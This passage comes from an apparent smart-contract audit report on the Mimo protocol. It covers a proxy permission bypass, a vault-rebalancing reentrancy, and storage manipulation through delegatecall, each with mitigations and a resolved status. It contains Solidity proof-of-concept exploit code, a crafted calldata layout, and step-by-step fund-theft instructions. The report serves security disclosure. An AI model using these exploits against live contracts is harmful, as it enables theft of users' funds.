selector&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Function that prepare attacker calldata</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getAttackerCalldata</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">)  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">usualCalldata</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">.</span><span class=\"mtk12\">execute</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">usualCalldata</span><span class=\"mtk1\">, </span><span class=\"mtk12\">signatureWithPermision</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">exploit</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk11\">call</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getAttackerCalldata</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>If you call <code>exploit</code>, it would succeed but it shouldn’t (since exploit call execute with <code>0x00000000....</code> instead of the permitted 4bytes <code>0xdead1337</code>). </p>\n<p>The exploit here is if you permitted contract A to run function foo only, A.fallback() is also permitted.</p>\n<p>Your <code>getSelector</code> PoC won’t work if you are passing a non-empty bytes, it would work if you construct a call like <code>0x0cbd17c800000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000dead1337</code><br>\nwhich is equivalent to calling <code>getSelector(\"\")</code> with some extra data <code>dead1337</code> at the end.</p>\n<p>Consider the calldata layout<br>\n[00] 0cbd17c8<br>\n[04] 0000000000000000000000000000000000000000000000000000000000000020 (data offset)<br>\n[24] 0000000000000000000000000000000000000000000000000000000000000000 (data len)<br>\n[44] dead1337</p>\n<p>data.offset = 0x04 + 0x20 (data offset) + 0x20 (1 word for length) = 0x44</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/159\">RayXpub (Mimo) confirmed</a></strong> </p>\n<p><strong>horsefacts (warden) reviewed mitigation:</strong></p>\n<blockquote>\n<p><strong>Status:</strong> ✅ Resolved</p>\n</blockquote>\n<blockquote>\n<p><strong>Finding:</strong> A warden identified that callers could bypass a permissions check in <code>MIMOProxy#execute</code> by passing specially constructed calldata, enabling the caller to invoke a contract’s fallback function.</p>\n</blockquote>\n<blockquote>\n<p><strong>What changed:</strong> <code>MIMOProxy#execute</code> now reads the first four bytes of the <code>data</code> parameter directly rather than using <code>data.offset</code> to extract the function selector from calldata. </p>\n</blockquote>\n<blockquote>\n<p><strong>Why it works:</strong> Since attackers can no longer manipulate the extracted selector, they cannot bypass the permissions check. A <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/test/01_unit/proxy/MIMOProxy.test.ts#L103\">unit test</a> demonstrates this behavior.</p>\n</blockquote>\n<hr>\n<h1 id=\"medium-risk-findings-8\" style=\"position:relative;\"><a href=\"#medium-risk-findings-8\" aria-label=\"medium risk findings 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (8)</h1>\n<h2 id=\"m-01-vault-rebalancing-can-be-exploited-if-two-vaults-rebalance-into-the-same-vault\" style=\"position:relative;\"><a href=\"#m-01-vault-rebalancing-can-be-exploited-if-two-vaults-rebalance-into-the-same-vault\" aria-label=\"m 01 vault rebalancing can be exploited if two vaults rebalance into the same vault permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/39\">[M-01] Vault rebalancing can be exploited if two vaults rebalance into the same vault</a></h2>\n<p><em>Submitted by 0x52, also found by ayeslick</em></p>\n<p>User funds stolen.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Swap data is completely arbitrary and can be used to swap though malicious ERC20 tokens allowing control transfer. This control transfer would allow the attacker to call rebalance on a second vault and exploit both as long as both vaults rebalance into the same vault.</p>\n<p>Assumptions:<br>\nVault A and C both rebalance into vault B (i.e. value is transferred from vault A and C to vault B)<br>\nVault A and C are both eligible for rebalances<br></p>\n<p>Vault A -<br>\nValue: $100<br>\nFlashloan value: 50<br></p>\n<p>Vault B -<br>\nValue: $100<br></p>\n<p>Vault C -<br>\nValue: $100<br>\nFlashloan value: 50<br></p>\n<ol>\n<li>User calls rebalance on vault A to trigger it rebalancing to vault B, storing vault B’s value as $100</li>\n<li>During the swap control is transferred due to use of malicious ERC20 specified in swap data</li>\n<li>Malicious token calls rebalance on vault C to trigger a rebalancing to vault B, storing vault B’s value as $100 because Vault B’s value hasn’t been modified yet.</li>\n<li>Swap data in vault C rebalance swaps flashloan C to $50 worth of asset B</li>\n<li>Vault C rebalance deposits swap funds into vault B</li>\n<li>Vault C rebalance withdraws from vault C to pay back flashloan C</li>\n<li>Vault C rebalance validates that the value of B = $150 ( 100 + 50 ) and finishes, resuming Vault A rebalance</li>\n<li>Vault A rebalance finishes its swap, siphoning off the swapped funds to attacker through the malicious pool</li>\n<li>Vault A rebalance doesn’t deposit any funds but the value of vault B has already been increased by rebalance C</li>\n<li>Vault A rebalance withdraws from vault A to pay back vault flashloan A</li>\n<li>Vault A rebalance validates that the value of B = $150 ( 100 + 50 )</li>\n</ol>\n<p>The attacker has now stolen funds, up to half the value of the total rebalance amount.</p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add nonReentrant modifier to MIMOAutomatedRebalnce.sol#rebalance.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/39#issuecomment-1210505384\">RayXpub (Mimo) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>The attack described seems to be missing some elements mainly on item 9. Rebalance can’t choose to just not deposit as it calls <code>depositAndBorrow()</code> with a <code>mintAmount</code> computed onchain through the <code>_getAmounts()</code> function so it will have to mint some amount. This might be possible if the additional minting requirement by the second rebalance repayment can happen within the limits of vault B MCR. This seems to be an edge case and a complex attack, as it would require 2 vaults under trigger ratio, a malicious pool with enough liquidity and a user set mcr buffer high enough to not require additional deposit on second rebalance.</p>\n<p>Given the complexity and the low probability of this attack we think it should be downgraded to medium risk. We do plan on applying the recommendation of adding nonReentrant modifier.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/39\">gzeoneth (judge) decreased severity to Medium</a></strong> </p>\n<p><strong>horsefacts (warden) reviewed mitigation:</strong></p>\n<blockquote>\n<p><strong>Status:</strong> ✅ Resolved</p>\n</blockquote>\n<blockquote>\n<p><strong>Finding:</strong> Wardens identified that <code>MIMOAutoRebalance#rebalance</code> was vulnerable to reentrancy by swapping through a malicious token that transfers control to the caller.</p>\n</blockquote>\n<blockquote>\n<p><strong>What changed:</strong> The Mimo team added a <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/contracts/actions/automated/MIMOAutoRebalance.sol#L59\">reentrancy guard</a> to the <code>rebalance</code> function. An <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/test/02_integration/automated/MIMOAutoActionSecurity.test.ts#L137\">integration test</a> demonstrates that the function is protected against reentrancy.</p>\n</blockquote>\n<blockquote>\n<p><strong>Why it works:</strong> Since <code>rebalance</code> is protected by a reentrancy guard, attempts to reenter <code>rebalance</code> will now revert.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-malicious-targets-can-manipulate-mimoproxy-permissions\" style=\"position:relative;\"><a href=\"#m-02-malicious-targets-can-manipulate-mimoproxy-permissions\" aria-label=\"m 02 malicious targets can manipulate mimoproxy permissions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/161\">[M-02] Malicious targets can manipulate MIMOProxy permissions</a></h2>\n<p><em>Submitted by horsefacts, also found by ayeslick, cccz, peritoflores, teddav, and vlad_bochok</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L21-L24\">https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L21-L24</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L55-L64\">https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L55-L64</a></p>\n<h3 id=\"vulnerability-details\" style=\"position:relative;\"><a href=\"#vulnerability-details\" aria-label=\"vulnerability details permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability Details</h3>\n<p>The <code>MIMOProxy</code> contract stores per-caller, per-target, per-selector permissions in a nested internal mapping.</p>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L21-L24\"><code>MIMOProxy.sol#L21</code></a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">/// INTERNAL STORAGE ///</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">/// @notice Maps envoys to target contracts to function selectors to boolean flags.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">))) </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_permissions</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>If the caller of <code>execute</code> is an authorized “envoy” with the right permissions, they are allowed to <code>delegatecall</code> from the <code>MIMOProxy</code> instance.</p>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L55-L64\"><code>MIMOProxy.sol#L55</code></a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Check that the caller is either the owner or an envoy.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">selector</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        selector := </span><span class=\"mtk11\">calldataload</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">offset</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">_permissions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">][</span><span class=\"mtk12\">target</span><span class=\"mtk1\">][</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">]) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CustomErrors</span><span class=\"mtk1\">.</span><span class=\"mtk11\">EXECUTION_NOT_AUTHORIZED</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>However, although these permissions are stored in an internal mapping, a malicious (or malfunctioning) target contract with the same or overlapping storage layout may manipulate envoy permissions. Malicious target contracts may use this method to grant themselves additional permissions or authorize other envoys and targets.</p>\n<p>Note that <code>MIMOProxy</code> defends against similar attempts to change the contract <code>owner</code> by <a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L72-L73\">storing the current owner address</a> before executing <code>delegatecall</code> and <a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L81-L84\">checking that it has not changed</a> after. However, due to the nature of Solidity mappings, and the nestedness of the permissions mapping, it’s not feasible to perform the same check for envoy permissions.</p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>An authorized envoy + malicious target may intentionally modify or accidentally overwrite envoy permissions. Malicious target contracts may attempt to trick users into escalating privileges using this method.</p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>This is a tough one, but if the addresses of Mimo-authorized target contracts are known, consider maintaining and consulting an external registry to further constrain envoys and prevent them from calling target contracts that are not known Mimo modules:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">ITargetRegistry</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">targetRegistry</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getPermission</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">envoy</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">target</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">selector</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_permissions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">envoy</span><span class=\"mtk1\">][</span><span class=\"mtk12\">target</span><span class=\"mtk1\">][</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">] &amp;&amp; </span><span class=\"mtk12\">targetRegistry</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isAuthorized</span><span class=\"mtk1\">(</span><span class=\"mtk12\">target</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<h4 id=\"test-cases\" style=\"position:relative;\"><a href=\"#test-cases\" aria-label=\"test cases permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Test cases</h4>\n<p>We’ll use this <code>ProxyAttacks</code> helper contract to manipulate proxy storage. Note that it has the same storage layout as <code>MIMOProxy</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProxyAttacks</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minGasReserve</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">))) </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_permissions</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk3\">// 